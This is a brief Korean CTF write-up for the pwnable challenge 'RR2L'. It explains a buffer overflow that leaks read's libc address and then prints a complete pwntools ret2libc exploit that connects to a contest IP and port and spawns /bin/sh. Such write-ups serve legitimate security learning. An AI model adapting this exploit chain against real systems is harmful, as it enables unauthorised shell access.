## No.4 Pwnable RR2L[50]

**점수:** 50

**분야:** Pwnable

**제목:** RR2L

**Description:**

> Get a shell. The flag is located in the directory where the problem is located. The name of the file with flag is flag.
> 
> nc 223.194.105.182 37100
> Download : https://goo.gl/HdNBu4

BOF를 이용해 먼저 read 함수의 주소를 leak 시킨다.

마침 사용중인 libc가 대회 서버와 동일한 버전이어서 간단하게 system 함수와 ‘/bin/sh’의 주소를 찾을 수 있었다.

```python
from pwn import *
 
r = remote('223.194.105.182', 37100)
 
print r.recvline()
 
payload = 'A' * 104
payload += p32(0x8048410) # write@plt
payload += p32(0x804852b)
payload += p32(1)
payload += p32(0x804A00C) # read@got
payload += p32(4)
 
r.sendline(payload)
r.recv(1024)
read_got = u32(r.recvn(4))
libc_base = read_got - 0xd5980
system = libc_base + 0x3ada0
binsh = libc_base + 0x15B82B
log.info('libc is at {}'.format(hex(libc_base)))
 
payload = 'A' * 104
payload += p32(system)
payload += p32(0xdeadbeef)
payload += p32(binsh)
 
r.sendline(payload)
r.interactive()
```
